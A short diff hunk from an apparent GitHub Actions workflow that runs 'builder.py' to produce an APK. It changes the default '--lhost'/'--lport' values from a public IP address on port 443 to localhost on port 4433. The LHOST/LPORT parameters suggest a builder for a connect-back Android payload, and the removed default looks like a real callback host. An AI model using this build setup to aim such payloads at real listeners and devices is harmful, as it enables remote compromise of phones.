@@ -44,8 +44,8 @@ jobs:
         run: |
           # If you don't use secrets, hardcode or use defaults
           python builder.py \
-            --lhost "${LHOST:-194.169.34.12}" \
-            --lport "${LPORT:-443}" \
+            --lhost "${LHOST:-127.0.0.1}" \
+            --lport "${LPORT:-4433}" \
             --output "dist/${{ steps.vars.outputs.apk_name }}"
 
       
